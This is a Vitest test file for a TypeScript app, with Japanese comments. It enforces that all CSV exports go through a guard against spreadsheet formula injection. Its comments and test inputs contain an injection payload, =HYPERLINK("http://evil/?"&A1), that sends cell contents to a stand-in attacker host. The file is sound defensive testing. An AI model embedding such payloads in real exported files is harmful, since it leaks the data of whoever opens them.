import { describe, expect, it } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { needsFormulaGuard, toCsv } from '../csv';

/*
 * **CSV を書き出す経路は、全部 `data/csv.ts` の関門を通る。**
 *
 * ## 何から守るのか —— 数式注入
 *
 * `=`, `+`, `-`, `@`, タブ, CR で始まる欄は、Excel / LibreOffice /
 * Google スプレッドシートが**数式として実行する**。
 * `=HYPERLINK("http://evil/?"&A1)` のような値を書き出したファイルへ
 * 埋め込めば、開いた人の手元でセルの中身が外へ出る。
 *
 * `data/csv.ts` の `encodeField` は先頭へ `'` を足して打ち消し、
 * `unguardFormula` で読み戻すので往復しても値が変わらない。
 *
 * ## なぜこの検査が要るか (2026-08-23)
 *
 * 打ち消しの実装はよく出来ていた。**だが新しい書き出しをそこへ通す仕組みが
 * 無かった。** 実測: `salesCsv.ts` へ手組みの
 *
 * ```ts
 * export function probeToCsv(rows) { return rows.map((r) => r.join(',')).join('\r\n'); }
 * ```
 *
 * を足しても、**27 のゲートすべてが緑のまま**通った。
 * このセッションで繰り返し出た形である ——
 * **関門は在るが、新しい経路をそこへ通す強制が無い。**
 */

function sourceFiles(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) {
      if (name !== '__tests__' && name !== 'node_modules') sourceFiles(full, out);
      continue;
    }
    if (/\.tsx?$/.test(name)) out.push(full);
  }
  return out;
}

/** 関門そのもの。ここだけは自分で組み立ててよい。 */
const GATE = 'src/renderer/data/csv.ts';

const norm = (p: string): string => p.split('\\').join('/');

describe('CSV の書き出しは関門を通る', () => {
  it('`*Csv` という名の export を持つファイルは、関門を import している', () => {
    const offenders: string[] = [];
    for (const f of sourceFiles('src')) {
      if (norm(f).endsWith(GATE)) continue;
      const text = readFileSync(f, 'utf8');
      const code = text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
      if (!/export function \w*Csv\b/.test(code)) continue;
      // `from './csv'` / `from '../data/csv'` などを受ける。
      if (!/from\s+'[^']*\/csv'/.test(code)) offenders.push(f);
    }
    expect(
      offenders,
      "CSV を組み立てているのに data/csv.ts を通していません (数式打ち消しが掛かりません)",
    ).toEqual([]);
  });

  it('行を自分で組み立てているファイルは関門だけ', () => {
    const offenders: string[] = [];
    for (const f of sourceFiles('src')) {
      if (norm(f).endsWith(GATE)) continue;
      const code = readFileSync(f, 'utf8')
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/^\s*\/\/.*$/gm, '');
      const joinsFields = /\.join\(\s*','\s*\)/.test(code);
      const joinsRows = /\.join\(\s*'\\r\\n'\s*\)|\.join\(\s*'\\n'\s*\)/.test(code);
      if (joinsFields && joinsRows) offenders.push(f);
    }
    expect(offenders, 'CSV の行を手組みしています (関門を通してください)').toEqual([]);
  });

  /*
   * **打ち消しの対象が痩せていないか。** 実装の定数は export されていないので、
   * *振る舞い*で留める —— 字面より変更に強い。
   */
  it.each(['=', '+', '-', '@', '\t', '\r'])('%j で始まる欄は打ち消す', (ch) => {
    expect(needsFormulaGuard(`${ch}HYPERLINK("http://evil/")`)).toBe(true);
  });

  it('ふつうの負の数は打ち消さない (数値を壊さない)', () => {
    for (const v of ['-1', '-1.5', '+2', '-0.5e3']) {
      expect(needsFormulaGuard(v), `${v} を数式扱いした`).toBe(false);
    }
  });

  it('実際に書き出した行に生の数式が出ない', () => {
    const out = toCsv([['label'], ['=HYPERLINK("http://evil/?"&A1)']]);
    expect(out).not.toMatch(/(^|\r\n)"?=/);
    expect(out).toContain("'=HYPERLINK");
  });

  /* 走査が動いていること (空虚に通っていない)。 */
  it('負の対照: 走査は実物のファイルを読んでいる', () => {
    const files = sourceFiles('src');
    expect(files.length).toBeGreaterThan(200);
    expect(files.map(norm).some((f) => f.endsWith('salesCsv.ts'))).toBe(true);
  });
});
